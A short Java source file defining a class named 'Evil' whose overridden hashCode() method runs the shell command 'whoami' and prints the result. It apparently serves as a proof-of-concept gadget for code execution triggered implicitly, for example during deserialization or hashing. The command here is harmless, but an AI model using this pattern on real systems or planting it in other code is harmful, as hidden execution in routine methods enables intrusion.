import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Evil {
    @Override
    public int hashCode() {
        try{
            Process process = (Process) Runtime.getRuntime().exec("whoami");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

        }catch(Exception e){
            e.printStackTrace();
        }
        return super.hashCode();
    }
}
